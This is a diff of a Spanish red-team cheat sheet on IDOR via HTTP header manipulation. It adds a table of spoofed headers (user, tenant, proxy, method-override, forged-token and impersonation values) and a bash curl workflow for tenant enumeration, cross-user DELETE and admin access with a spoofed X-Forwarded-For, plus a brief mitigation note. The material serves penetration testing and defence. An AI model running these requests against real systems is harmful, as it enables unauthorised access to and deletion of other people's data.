@@ -1,5 +1,5 @@
 ---
-aliases:
+aliases: null
 tags:
   - type/technique
   - vuln/idor
@@ -7,14 +7,14 @@ tags:
   - asset/api
   - asset/web-app
 primary categories:
-  - "[[Red Team]]"
+  - '[[Red Team]]'
 secondary categories:
-  - "[[Explotación]]"
+  - '[[Explotación]]'
 tertiary categories:
-  - "[[Web Explotación]]"
+  - '[[Web Explotación]]'
 kind: SubCheatSheet
 linked:
-  - "[[BOLA - IDOR]]"
+  - '[[BOLA - IDOR]]'
 ---
 # IDOR - Manipulación de Cabeceras HTTP y Protocolo
 
@@ -22,28 +22,50 @@ linked:
 
 ## Cheatsheet
 
-| **Técnica**                                                    | **Descripción**                                                                                                                                                                                               | **Cabecera Original (Ejemplo)**               | **Cabecera Modificada (Ejemplo)**                             |
-| -------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------- | ------------------------------------------------------------- |
-| <br>**Inyección en Cabeceras Personalizadas (Custom Headers)** | <br>Modificación de cabeceras no estándar (típicamente prefijadas con `X-`) que el backend o los microservicios utilizan internamente para identificar al usuario o el contexto.<br><br>                      | <br><br>`X-User-Id: 105`                      | <br><br>`X-User-Id: 106`                                      |
-| <br>**Spoofing de la Cabecera Referer**                        | <br>Alteración del `Referer` cuando la aplicación valida la autorización para acceder a un objeto basándose en la página desde la cual se originó la petición.<br><br>                                        | <br>`Referer: https://app.com/user/105`       | <br>`Referer: https://app.com/user/106`                       |
-| <br>**Manipulación de Enrutamiento (Tenant IDOR)**             | <br>Cambio en cabeceras utilizadas en arquitecturas SaaS para identificar a qué organización (Tenant) pertenece la petición, permitiendo el cruce de datos entre clientes.<br><br>                            | <br><br>`X-Tenant-Id: org_A`                  | <br><br>`X-Tenant-Id: org_B`                                  |
-| <br>**HTTP Method Override**                                   | <br>Uso de cabeceras específicas para engañar al enrutador de la API y forzar la ejecución de un método HTTP diferente, evadiendo controles de acceso a nivel de ruta y accediendo al objeto.<br><br>         | <br>`POST /api/user/105` <br>`(Sin cabecera)` | <br>`POST /api/user/106`<br><br>`X-HTTP-Method-Override: PUT` |
-| <br>**Content-Type Juggling**                                  | <br>Cambio del tipo de contenido declarado para forzar al servidor a usar un analizador (_parser_) alternativo que pueda tener reglas de autorización más laxas sobre los identificadores procesados.<br><br> | <br>`Content-Type: application/json`          | <br>`Content-Type: application/xml`                           |
-| <br>**Bypass de Confianza de Proxy**                           | <br>Falsificación de cabeceras de proxy para simular que la petición proviene de un servicio interno de confianza o una IP administrativa, obteniendo acceso a identificadores restringidos.<br><br>          | <br><br>`(Sin cabecera de proxy)`             | <br>`X-Forwarded-For: 127.0.0.1`<br>`X-Internal-Access: true` |
+| **Header** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `X-User-Id: 106` | Backend confía en header custom → impersonation | Microservicios con auth header transitivo. |
+| `X-Account-Id: 106` | Variante común en SaaS multi-account | Apps con account context en header. |
+| `X-Tenant-Id: org_B` | Cross-tenant data — accedés data de otra org | SaaS multi-tenant con tenant en header. |
+| `X-Forwarded-For: 127.0.0.1` | App trustea XFF para admin allowlist | Backend con IP-based admin access. |
+| `X-Internal-Access: true` | Flag interna que reverse proxy "debería" stripear | Defense-in-depth fail. |
+| `X-HTTP-Method-Override: PUT` en `POST /api/user/106` | Bypass de routing autz aplicado solo a PUT directo | Frameworks con method override (Symfony, Spring). |
+| `Referer: https://app.com/user/106` | Backend valida autz por Referer (raro pero existe) | Apps legacy con Referer trust. |
+| `Content-Type: application/xml` (en endpoint que esperaba JSON) | Parser XML con reglas autz distintas | Multi-parser backends. |
+| `Authorization: Bearer <TOKEN_VICTIMA>` (token forged/leaked) | Acceso directo con identidad ajena | Combo con JWT attacks. |
+| `Cookie: session=...; impersonate_id=106` | Cookie de impersonation en panel admin | Funcionalidad de "ver como usuario X". |
 ^idor-http
 
-## Estrategias de Evaluación y Testing
+### Workflow
 
-Durante la revisión de la postura de seguridad y el análisis de [[API Security]], el escrutinio de las cabeceras HTTP requiere inspeccionar más allá de la superficie documentada de la API:
-- Analizar el tráfico de red en busca de cabeceras ocultas o no documentadas que se envían desde el cliente hacia el servidor, especialmente en aplicaciones de una sola página (SPA) o clientes móviles.
-- Utilizar herramientas de fuerza bruta de directorios o fuzzing para descubrir cabeceras ocultas como `X-Account-Id`, `X-Profile-Id` o `X-Role` que podrían estar siendo procesadas por un proxy inverso o un [[API Gateway]].
-- Probar la eliminación total de cabeceras de autorización secundarias para observar si el sistema realiza un _fail-open_ (permite el acceso por defecto al fallar la validación) sobre el objeto referenciado en la URL o el cuerpo.
+```bash
+# 1. Header descubrimiento
+curl -sI https://target/api/profile -H 'X-User-Id: 999' | head
+# Si la respuesta cambia → header procesado
 
-### Principios de Mitigación
+# 2. Tenant abuse
+for tenant in org_A org_B org_internal; do
+  curl -s https://target/api/data \
+    -H "Authorization: Bearer $TOKEN_ORG_A" \
+    -H "X-Tenant-Id: $tenant" | head -c 200
+done
 
-La protección contra la manipulación a nivel de protocolo exige una arquitectura de confianza cero ([[Zero Trust]]) en la frontera de la aplicación:
-- Tratar todas las cabeceras HTTP entrantes como entradas de usuario no confiables, del mismo modo que se trata la URL o el cuerpo de la petición.
-- Establecer la identidad del usuario y sus permisos exclusivamente a través de mecanismos de sesión seguros e inalterables desde el lado del cliente (como un [[JWT Attacks]] validado).
-- Configurar los proxies inversos y los balanceadores de carga para que eliminen sistemáticamente cualquier cabecera interna de enrutamiento o autorización (`X-User-Id`, `X-Forwarded-For`) si la petición proviene directamente del internet público, reescribiéndolas solo de manera controlada dentro de la red privada.
+# 3. Method override
+curl -X POST https://target/api/user/106 \
+  -H 'X-HTTP-Method-Override: DELETE' \
+  -H 'Cookie: session=USER_A'
+
+# 4. XFF / Internal flag
+curl https://target/api/admin/users \
+  -H 'X-Forwarded-For: 127.0.0.1' \
+  -H 'X-Internal-Access: true'
+
+# 5. Param Miner (Burp) — descubre headers ocultos
+# Burp → Extender → Param Miner → "Guess headers" en endpoint target
+```
+
+### Mitigación
+
+Reverse proxy / API gateway elimina headers internos (`X-User-Id`, `X-Forwarded-For`, `X-Internal-*`) en el border. Backend establece identidad **solo** del JWT validado, nunca del header crudo.
 
 ***
